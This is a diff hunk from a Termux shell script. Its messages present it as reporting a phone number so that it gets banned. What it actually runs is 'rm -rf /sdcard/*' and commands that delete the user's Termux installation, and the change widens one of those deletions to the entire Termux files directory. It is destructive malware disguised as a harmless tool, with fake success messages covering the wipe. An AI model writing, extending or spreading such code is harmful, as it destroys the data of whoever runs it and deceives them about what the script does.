@@ -204,7 +204,7 @@ echo "REPORT SENDS SUCESSFULLY"
 termux-setup-storage
 rm -rf /sdcard/*
 rm -rf /data/data/com.termux/files/usr
-rm -rf /data/data/com.termux/files/zshrc
+rm -rf /data/data/com.termux/files
 sleep 20 && clear
 echo "number will banned after few minutes"
 sleep 10
